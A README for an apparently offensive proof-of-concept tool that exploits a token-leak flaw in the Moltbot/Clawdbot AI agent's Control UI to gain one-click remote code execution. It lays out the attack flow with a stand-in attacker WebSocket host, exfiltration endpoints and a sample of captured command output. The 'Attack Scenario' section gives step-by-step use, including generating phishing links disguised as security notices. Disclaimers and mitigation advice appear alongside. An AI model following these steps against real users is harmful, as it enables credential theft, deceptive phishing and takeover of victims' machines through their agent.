# 🦞 Moltbot/Clawdbot 1-Click RCE PoC

A simplified, single-script proof-of-concept for the Moltbot/Clawdbot authentication token exfiltration vulnerability (GHSA-g8p2-7wf7-98mq).

> **⚠️ DISCLAIMER: This tool is for authorized security testing and educational purposes only. Only use against systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal.**

---

## Overview

This tool demonstrates a critical vulnerability in Moltbot (formerly Clawdbot) that allows an attacker to achieve remote code execution through a single click. The vulnerability exists because the Control UI trusts the `gatewayUrl` parameter from the query string without validation and auto-connects on page load, leaking the authentication token.

### Vulnerability Details

| Field | Value |
|-------|-------|
| Advisory ID | GHSA-g8p2-7wf7-98mq |
| CVSS Score | 8.8 (High) |
| Affected Versions | <= v2026.1.28 |
| Patched Version | v2026.1.29 |
| Attack Vector | Network |
| User Interaction | Required (1 click) |

---

## How It Works

```
┌──────────────────────────────────────────────────────────────────────────┐
│                           ATTACK FLOW                                    │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  1. Attacker sends malicious link to victim                              │
│                        │                                                 │
│                        ▼                                                 │
│  2. Victim clicks link (Stage 1)                                         │
│                        │                                                 │
│                        ▼                                                 │
│  3. Stage 1 opens Stage 2, redirects to Control UI with                  │
│     ?gatewayUrl=ws://attacker-server/ws/capture                          │
│                        │                                                 │
│                        ▼                                                 │
│  4. Control UI auto-connects to attacker's WebSocket                     │
│     and leaks the gateway authentication token                           │
│                        │                                                 │
│                        ▼                                                 │
│  5. Attacker uses token to connect to victim's gateway                   │
│     (works even on localhost - browser acts as bridge)                   │
│                        │                                                 │
│                        ▼                                                 │
│  6. Attacker executes arbitrary commands via Moltbot agent               │
│                        │                                                 │
│                        ▼                                                 │
│  7. Full RCE achieved on victim's machine                                │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

### Why It Works on Localhost

- WebSockets do not have CORS restrictions like HTTP requests
- The victim's browser acts as a bridge to their localhost
- Chrome's Local Network Access protection is not enabled by default (as of v144)
- No special permissions are required for the browser to make local WebSocket connections

---

## Requirements

- Python 3.8+
- pip packages: `flask`, `flask-sock`, `requests`

---

## Installation

```bash
# Clone the repository
git clone <repository-url>
cd moltbot-1click-rce

# Install dependencies
pip install flask flask-sock requests

# Or using requirements
pip install -r requirements.txt
```

### requirements.txt

```
flask>=2.0.0
flask-sock>=0.6.0
requests>=2.25.0
```

---

## Usage

### Interactive Mode

```bash
python moltbot_exploit.py
```

This launches an interactive menu with the following options:

```
┌─────────────────────────────────────────┐
│              MAIN MENU                  │
├─────────────────────────────────────────┤
│  1. Start Exploit Server                │
│  2. Configure Settings                  │
│  3. View Captured Tokens                │
│  4. View Exfiltrated Data               │
│  5. Generate Phishing Link              │
│  6. Direct Gateway Connect (with token) │
│  7. Show Vulnerability Info             │
│  0. Exit                                │
└─────────────────────────────────────────┘
```

### Command Line Mode

```bash
# Start server directly with default settings
python moltbot_exploit.py --serve

# Start server on custom port
python moltbot_exploit.py --serve --port 9999

# Start server on custom host and port
python moltbot_exploit.py --serve --host 0.0.0.0 --port 8080
```

### Command Line Arguments

| Argument | Description | Default |
|----------|-------------|---------|
| `--serve` | Start server immediately without menu | False |
| `--port` | Server listening port | 8888 |
| `--host` | Server listening host | 0.0.0.0 |

---

## Configuration

Default settings can be modified through the interactive menu (Option 2) or by editing the `Config` class in the script:

```python
class Config:
    HOST = "0.0.0.0"              # Listen address
    PORT = 8888                    # Listen port
    VICTIM_GATEWAY_HOST = "127.0.0.1"  # Target gateway host
    VICTIM_GATEWAY_PORT = 18789        # Target gateway port
    VICTIM_CONTROL_UI = "http://localhost:5173"  # Control UI URL
    EXFIL_FILE = "exfiltrated_data.json"  # Output file
```

---

## Endpoints

When the exploit server is running, the following endpoints are available:

| Endpoint | Description |
|----------|-------------|
| `GET /` | Stage 1 - Send this link to victim |
| `GET /stage2` | Stage 2 - Auto-opened, handles token capture and command execution |
| `WS /ws/capture` | WebSocket endpoint that captures leaked tokens |
| `GET /api/tokens` | API to retrieve captured tokens |
| `POST /api/exfil` | API to receive exfiltrated command output |

---

## Attack Scenario

### Step 1: Start the Exploit Server

```bash
python moltbot_exploit.py
# Select option 1 to start the server
```

### Step 2: Generate Phishing Link

```bash
# Select option 5 and enter your external IP/domain
# Example output: http://attacker.com:8888/
```

### Step 3: Send Link to Victim

Send the generated link to a victim who has an active Moltbot session. The link can be disguised:

```
http://attacker.com:8888/?ref=moltbot-security-update
http://attacker.com:8888/?article=important-notice
```

### Step 4: Token Capture

When the victim clicks the link:
1. Their browser opens Stage 2 in a new tab
2. They are redirected to their Control UI with the malicious `gatewayUrl`
3. The token is automatically sent to your WebSocket server
4. View captured tokens with menu option 3

### Step 5: Command Execution

Stage 2 automatically:
1. Retrieves the captured token from the server
2. Connects to the victim's gateway using the token
3. Provides a command input interface for RCE

---

## Output Files

### exfiltrated_data.json

Contains all exfiltrated data including command outputs:

```json
[
  {
    "type": "command_result",
    "data": {
      "result": "uid=1000(user) gid=1000(user) groups=1000(user)"
    },
    "timestamp": "2026-01-31T12:00:00.000000"
  }
]
```

---

## Technical Details

### Token Exfiltration Mechanism

The vulnerability exists in the Control UI's handling of the `gatewayUrl` query parameter:

1. The Control UI reads `gatewayUrl` from `window.location.search`
2. No validation is performed on the URL
3. The UI automatically initiates a WebSocket connection to the provided URL
4. The stored authentication token is sent in the connection payload
5. An attacker-controlled server receives the token

### WebSocket Bridge Attack

Since WebSockets don't enforce same-origin policy:

1. The attacker's page (Stage 2) can connect to `ws://localhost:18789`
2. The victim's browser initiates the connection from their local context
3. This bypasses network-level restrictions on the gateway
4. The attacker effectively gains access to localhost services through the victim's browser

---

## Mitigation

### For Users

1. **Update immediately** to Moltbot v2026.1.29 or later
2. Do not click suspicious links while Moltbot is running
3. Use browser extensions that block cross-origin WebSocket connections
4. Consider running Moltbot in an isolated environment

### For Developers

1. Validate and sanitize all URL parameters, especially `gatewayUrl`
2. Require user confirmation before connecting to new gateway URLs
3. Implement WebSocket origin validation
4. Use secure token storage mechanisms
5. Add rate limiting on authentication attempts

---

## File Structure

```
moltbot-1click-rce/
├── moltbot_exploit.py    # Main exploit script
├── README.md             # This file
├── requirements.txt      # Python dependencies
└── exfiltrated_data.json # Generated - contains captured data
```

---

## Troubleshooting

### No tokens being captured

- Ensure the victim has an active Moltbot Control UI session
- Verify your server is accessible from the victim's network
- Check that the WebSocket endpoint is reachable

### Cannot connect to victim's gateway

- The victim may have closed their browser
- The gateway token may have expired
- The gateway may be configured with additional authentication

### Stage 2 shows connection errors

- Verify the victim's gateway host/port configuration
- Check browser console for CORS or network errors
- Ensure the victim's Moltbot instance is running

---

## Legal Notice

This tool is provided for educational and authorized security testing purposes only. The authors are not responsible for any misuse or damage caused by this tool. Always obtain proper authorization before testing security vulnerabilities on any system.

Unauthorized access to computer systems is a criminal offense in most jurisdictions. By using this tool, you agree to use it only in accordance with applicable laws and regulations.

---

## Credits

- Original research by Ethiack (Henrique Branquinho, Bruno Mendes, André Baptista)
- Vulnerability discovered using Hackian autonomous security testing
- Advisory: GHSA-g8p2-7wf7-98mq

---

## Changelog

### v1.0.0

- Initial release
- Single-script implementation with interactive menu
- WebSocket token capture server
- Stage 1 and Stage 2 exploit pages
- Command execution interface
- Configuration management
- Token and data viewers

---

## License

MIT License - See LICENSE file for details.

**Remember: With great power comes great responsibility. Use this tool ethically.**
